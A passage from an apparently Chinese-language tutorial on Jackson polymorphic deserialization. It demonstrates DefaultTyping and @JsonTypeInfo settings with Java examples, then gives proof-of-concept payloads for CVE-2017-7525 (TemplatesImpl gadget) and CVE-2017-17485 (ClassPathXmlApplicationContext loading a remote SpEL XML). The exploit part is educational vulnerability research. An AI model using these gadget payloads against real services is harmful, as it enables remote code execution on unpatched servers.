<h4 id="3-2-3-NON-CONCRETE-AND-ARRAYS"><a href="#3-2-3-NON-CONCRETE-AND-ARRAYS" class="headerlink" title="3.2.3 NON_CONCRETE_AND_ARRAYS"></a>3.2.3 NON_CONCRETE_AND_ARRAYS</h4><p>支持上文全部类型的Array类型。</p>
<p>我们定义一个对象数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[&#123;&quot;length&quot;:100&#125;,&#123;&quot;length&quot;:100&#125;]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对数组进行反序列化了</p>
<h4 id="3-2-4-NON-FINAL"><a href="#3-2-4-NON-FINAL" class="headerlink" title="3.2.4 NON_FINAL"></a>3.2.4 NON_FINAL</h4><p>除了前面的所有特征外，包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的属性信息都需要被序列化和反序列化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        Teacher[] teachers= <span class="keyword">new</span> Teacher[<span class="number">2</span>];</span><br><span class="line">        teachers[<span class="number">0</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        teachers[<span class="number">1</span>]=<span class="keyword">new</span> Teacher();</span><br><span class="line">        stu.object = teachers;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//[&quot;jackson.Student&quot;,&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;[Ljackson.Teacher;&quot;,[[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;],[&quot;jackson.Teacher&quot;,&#123;&quot;length&quot;:100&#125;]]],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, [Ljackson.Teacher;@26653222</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-5-总结"><a href="#3-2-5-总结" class="headerlink" title="3.2.5 总结"></a>3.2.5 总结</h4><p>DefaultTyping的几个设置选项是逐渐扩大适用范围的，如下表：</p>
<table>
<thead>
<tr>
<th align="left">DefaultTyping类型</th>
<th align="left">描述说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">JAVA_LANG_OBJECT</td>
<td align="left">属性的类型为Object</td>
</tr>
<tr>
<td align="left">OBJECT_AND_NON_CONCRETE</td>
<td align="left">属性的类型为Object、Interface、AbstractClass</td>
</tr>
<tr>
<td align="left">NON_CONCRETE_AND_ARRAYS</td>
<td align="left">属性的类型为Object、Interface、AbstractClass、Array</td>
</tr>
<tr>
<td align="left">NON_FINAL</td>
<td align="left">所有除了声明为final之外的属性</td>
</tr>
</tbody></table>
<h3 id="3-2-JsonTypeInfo注解"><a href="#3-2-JsonTypeInfo注解" class="headerlink" title="3.2 @JsonTypeInfo注解"></a>3.2 @JsonTypeInfo注解</h3><p>@JsonTypeInfo注解是Jackson多态类型绑定的一种方式，支持下面5种类型的取值：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NONE)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.NAME)</span><br><span class="line"><span class="variable">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.COSTOM)</span><br></pre></td></tr></table></figure>



<h4 id="3-2-1-JsonTypeInfo-Id-NONE"><a href="#3-2-1-JsonTypeInfo-Id-NONE" class="headerlink" title="3.2.1 JsonTypeInfo.Id.NONE"></a>3.2.1 JsonTypeInfo.Id.NONE</h4><p>设置@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)注解和不设置注解是一样的</p>
<p>不设置注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>设置注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3-2-2-JsonTypeInfo-Id-CLASS"><a href="#3-2-2-JsonTypeInfo-Id-CLASS" class="headerlink" title="3.2.2 JsonTypeInfo.Id.CLASS"></a>3.2.2 JsonTypeInfo.Id.CLASS</h4><p>JsonTypeInfo.Id.CLASS注解，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@class&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@3bfdc050</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将关联的类也给序列化了</p>
<h4 id="3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS"><a href="#3-2-3-JsonTypeInfo-Id-MINIMAL-CLASS" class="headerlink" title="3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS"></a>3.2.3 JsonTypeInfo.Id.MINIMAL_CLASS</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//&#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;@c&quot;:&quot;jackson.Boy&quot;,&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@5e3a8624</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看见@class变成了@c，缩短了相关类名</p>
<h4 id="3-2-4-JsonTypeInfo-Id-NAME"><a href="#3-2-4-JsonTypeInfo-Id-NAME" class="headerlink" title="3.2.4 JsonTypeInfo.Id.NAME"></a>3.2.4 JsonTypeInfo.Id.NAME</h4><p>序列化为</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;age&quot;</span>:<span class="number">20</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="attr">&quot;object&quot;</span>:&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Boy&quot;</span>,<span class="attr">&quot;length&quot;</span>:<span class="number">100</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的。</p>
<h4 id="3-2-5-JsonTypeInfo-Id-CUSTOM"><a href="#3-2-5-JsonTypeInfo-Id-CUSTOM" class="headerlink" title="3.2.5 JsonTypeInfo.Id.CUSTOM"></a>3.2.5 JsonTypeInfo.Id.CUSTOM</h4><p>其实这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常：</p>
<h3 id="3-3-反序列总结"><a href="#3-3-反序列总结" class="headerlink" title="3.3 反序列总结"></a>3.3 反序列总结</h3><p>所以按照上述分析，3种情况下可以触发Jackson反序列化漏洞</p>
<p>1、enableDefaultTyping()</p>
<p>2、@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</p>
<p>3、@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</p>
<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h2><h3 id="4-1-CVE-2017-7525（基于TemplatesImpl利用链）"><a href="#4-1-CVE-2017-7525（基于TemplatesImpl利用链）" class="headerlink" title="4.1 CVE-2017-7525（基于TemplatesImpl利用链）"></a>4.1 CVE-2017-7525（基于TemplatesImpl利用链）</h3><h3 id="环境限制"><a href="#环境限制" class="headerlink" title="环境限制"></a>环境限制</h3><p>Jackson 2.6系列 &lt; 2.6.7.1</p>
<p>Jackson 2.7系列 &lt; 2.7.9.1</p>
<p>Jackson 2.8系列 &lt; 2.8.8.1</p>
<p>JDK版本</p>
<p>POC </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;object&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;transletBytecodes&quot;</span>:[<span class="string">&quot;xxx&quot;</span>],</span><br><span class="line">            <span class="attr">&quot;transletName&quot;</span>:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;outputProperties&quot;</span>:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里解释下设置的几个JSON键值对：</p>
<ul>
<li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；</li>
<li>transletName——TemplatesImpl类对象的_name属性值；</li>
<li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li>
</ul>
<h3 id="4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#4-2-CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>4.2 CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p>
<p>Jackson 2.8系列 &lt; 2.8.11</p>
<p>Jackson 2.9系列 &lt; 2.9.4</p>
<p>不受JDK限制，可直接在JDK1.8上运行。</p>
<p>利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8000/spel.xml\&quot;]&quot;</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
